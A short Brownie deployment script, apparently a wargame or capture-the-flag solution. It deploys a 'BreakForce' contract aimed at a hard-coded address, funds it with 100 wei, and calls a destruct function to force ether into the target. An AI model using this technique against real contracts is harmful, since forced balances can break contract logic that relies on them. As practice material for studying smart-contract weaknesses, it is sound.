
from brownie import network, accounts, BreakForce


def main():
    network.gas_limit(700000)
    acct = accounts.load("deploy")

    labingi = BreakForce.deploy(
        "0x7832c91857f928962c1b9e1e3AAF3a48891485FC", {'from': acct})

    acct.transfer(labingi, 100)
    labingi.destr({'from': acct})
